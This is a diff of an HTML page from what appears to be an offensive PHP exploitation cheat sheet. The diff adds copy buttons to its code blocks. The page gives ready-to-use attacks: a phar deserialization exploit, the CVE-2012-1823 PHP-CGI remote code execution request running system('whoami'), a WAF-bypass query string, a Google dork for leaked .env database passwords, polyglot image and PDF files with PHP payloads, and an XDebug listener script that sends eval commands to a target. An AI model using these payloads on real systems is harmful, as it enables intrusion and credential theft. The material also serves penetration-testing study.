@@ -392,7 +392,7 @@
               <h1 id="php">PHP</h1>
 <h2 id="command-execution">Command execution</h2>
 <p>Here is a list of functions to execute commands on a system:</p>
-<pre><code class="language-none">exec
+<div class="clipboard-content">  <pre><code class="language-none">exec
 passthru
 shell_exec
 system
@@ -401,14 +401,23 @@ popen
 `{CMD}`
 curl_exec
 curl_multi_exec
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="exec
+passthru
+shell_exec
+system
+proc_open
+popen
+`{CMD}`
+curl_exec
+curl_multi_exec
+">    Copy  </button></div></div>
 <h2 id="deserialization">Deserialization</h2>
 <h3 id="phar-deserialization">Phar deserialization</h3>
 <p>The unserialization of a <code>phar</code> wrapper is realized in any file operation. Thus,
 file operation such as <code>file_exists</code> might be less protected, then it's possible
 to inject a <code>phar</code> wrapper within it.</p>
 <p>The following code describes how to create a <code>phar</code> wrapper:</p>
-<pre><code class="language-php">&lt;?php
+<div class="clipboard-content">  <pre><code class="language-php">&lt;?php
 
 require('weak_class.php');
 # We craft an object by overwriting some methods and functions
@@ -417,9 +426,18 @@ $obj-&gt;args = &quot;id&quot;;
 
 # Then, we serialize the object to a file
 file_put_contents(&quot;/tmp/exploit.phar&quot;, serialize($obj));
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="&lt;?php
+
+require('weak_class.php');
+# We craft an object by overwriting some methods and functions
+$obj = new WeakClass();
+$obj-&gt;args = &quot;id&quot;;
+
+# Then, we serialize the object to a file
+file_put_contents(&quot;/tmp/exploit.phar&quot;, serialize($obj));
+">    Copy  </button></div></div>
 <p>Here is an example of exploitable functions:</p>
-<pre><code class="language-none">copy
+<div class="clipboard-content">  <pre><code class="language-none">copy
 file_exists
 file_get_contents
 file_put_contents
@@ -449,30 +467,67 @@ rmdir
 stat
 touch
 unlink
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="copy
+file_exists
+file_get_contents
+file_put_contents
+file
+fileatime
+filectime
+filegroup
+fileinode
+filemtime
+fileowner
+fileperms
+filesize
+filetype
+fopen
+is_dir
+is_executable
+is_file
+is_link
+is_readable
+is_writable
+lstat
+mkdir
+parse_ini_file
+readfile
+rename
+rmdir
+stat
+touch
+unlink
+">    Copy  </button></div></div>
 <h2 id="cve-2012-1823-rce-in-php-cgi">CVE-2012-1823: RCE in PHP-CGI</h2>
 <p>PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection.</p>
 <p>You can show the page source code:</p>
-<pre><code class="language-none">GET https://&lt;host&gt;/file.php?-s
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-none">GET https://&lt;host&gt;/file.php?-s
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="GET https://&lt;host&gt;/file.php?-s
+">    Copy  </button></div></div>
 <p>Or even execute PHP scripts (or a remote code execution)</p>
-<pre><code class="language-none">POST https://&lt;host&gt;/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input
+<div class="clipboard-content">  <pre><code class="language-none">POST https://&lt;host&gt;/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input
 
 &lt;?php system('whoami'); ?&gt;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="POST https://&lt;host&gt;/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input
+
+&lt;?php system('whoami'); ?&gt;
+">    Copy  </button></div></div>
 <p>More details can be found on the Metasploit script <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/php_cgi_arg_injection.rb" target="_blank">here</a></p>
 <h2 id="bypass-waf-in-php">Bypass WAF in PHP</h2>
 <p>From <a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank">Abusing PHP query string parser to bypass IDS, IPS, and WAF</a>:</p>
-<pre><code class="language-none">/news.php?%20news[id%00=42 ==&gt; $_GET[&quot;news_id&quot;]
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-none">/news.php?%20news[id%00=42 ==&gt; $_GET[&quot;news_id&quot;]
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="/news.php?%20news[id%00=42 ==&gt; $_GET[&quot;news_id&quot;]
+">    Copy  </button></div></div>
 <h2 id="laravel-configuration-file">Laravel configuration file</h2>
 <p>The Laravel configuration file is sometimes exposed on the Internet with a dotEnv
 file at the root level of the web server:</p>
-<pre><code class="language-none">https://&lt;host&gt;/.env
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-none">https://&lt;host&gt;/.env
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="https://&lt;host&gt;/.env
+">    Copy  </button></div></div>
 <p>You can find vulnerable target using a Google dork:</p>
-<pre><code class="language-none">&quot;DB_PASSWORD&quot; filetype:env
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-none">&quot;DB_PASSWORD&quot; filetype:env
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="&quot;DB_PASSWORD&quot; filetype:env
+">    Copy  </button></div></div>
 <h2 id="php-session-files">PHP session files</h2>
 <p>On PHP the directive <a href="https://www.php.net/manual/en/session.configuration.php#ini.session.save-path" target="_blank"><code>session.save_path</code></a>
 set the folder where PHP will store the session files. So the session files are
@@ -503,16 +558,22 @@ file that contains a PHP payload.</p>
 <h3 id="gif89">GIF89</h3>
 <p><a href="/assets/polyglot.php.gif">This file</a>) contains a PHP payload in the <a href="https://www.w3.org/Graphics/GIF/spec-gif89a.txt" target="_blank">Comment
 Extension</a> of a 1 pixel GIF:</p>
-<pre><code class="language-bash">hexdump -C assets/polyglot.php.gif
+<div class="clipboard-content">  <pre><code class="language-bash">hexdump -C assets/polyglot.php.gif
 00000000  47 49 46 38 39 61 01 00  01 00 00 ff 00 2c 00 00  |GIF89a.......,..|
 00000010  00 00 01 00 01 00 00 02  00 21 fe 3c 3f 70 68 70  |.........!.&lt;?php|
 00000020  69 6e 66 6f 28 29 3b                              |info();|
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="hexdump -C assets/polyglot.php.gif
+00000000  47 49 46 38 39 61 01 00  01 00 00 ff 00 2c 00 00  |GIF89a.......,..|
+00000010  00 00 01 00 01 00 00 02  00 21 fe 3c 3f 70 68 70  |.........!.&lt;?php|
+00000020  69 6e 66 6f 28 29 3b                              |info();|
+">    Copy  </button></div></div>
 <h3 id="pdf">PDF</h3>
 <p>You can add a comment (<code>%</code>) on the PDF header:</p>
-<pre><code class="language-pdf">%PDF-1.2 %&lt;?phpinfo()?&gt;
+<div class="clipboard-content">  <pre><code class="language-pdf">%PDF-1.2 %&lt;?phpinfo()?&gt;
 ...
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="%PDF-1.2 %&lt;?phpinfo()?&gt;
+...
+">    Copy  </button></div></div>
 <h3 id="png-and-idat-chunks">PNG and IDAT chunks</h3>
 <p><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" target="_blank">In this blog post</a>,
 there is an example to create a PNG file that encode a <a href="/webshell/">webshell</a>
@@ -522,17 +583,22 @@ exploit is <a href="/assets/gen.php.png">here</a>.</p>
 <h3 id="others-formats">Others formats</h3>
 <p>On most formats (mp3, jpg, ...) there is an <code>EOF</code> after what we can add the
 payload. So the easiest way is to append to a valid file our payload:</p>
-<pre><code class="language-bash">cat valid.jpg payload.php &gt; polyglot.php.jpg
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">cat valid.jpg payload.php &gt; polyglot.php.jpg
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="cat valid.jpg payload.php &gt; polyglot.php.jpg
+">    Copy  </button></div></div>
 <h2 id="xdebug">XDebug</h2>
 <p>Make a request with the following parameters and header:</p>
-<pre><code class="language-http">GET /path/to/file.php?XDEBUG_SESSION_START=phpstorm HTTP/1.1
+<div class="clipboard-content">  <pre><code class="language-http">GET /path/to/file.php?XDEBUG_SESSION_START=phpstorm HTTP/1.1
 ...
 X-Forwarded-For: {YOUR_IP}
 HTTP_CLIENT_IP: {YOUR_IP}
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="GET /path/to/file.php?XDEBUG_SESSION_START=phpstorm HTTP/1.1
+...
+X-Forwarded-For: {YOUR_IP}
+HTTP_CLIENT_IP: {YOUR_IP}
+">    Copy  </button></div></div>
 <p>Then on your server execute the following python script:</p>
-<pre><code class="language-python">#!/usr/bin/python2
+<div class="clipboard-content">  <pre><code class="language-python">#!/usr/bin/python2
 import socket
 
 ip_port = ('0.0.0.0', 9000)
@@ -546,7 +612,21 @@ while True:
   print(client_data)
   data = raw_input('&gt;&gt; ')
   conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="#!/usr/bin/python2
+import socket
+
+ip_port = ('0.0.0.0', 9000)
+sk = socket.socket()
+sk.bind(ip_port)
+sk.listen(10)
+conn, addr = sk.accept()
+
+while True:
+  client_data = conn.recv(1024)
+  print(client_data)
+  data = raw_input('&gt;&gt; ')
+  conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
+">    Copy  </button></div></div>
             
           </div>
           <footer>
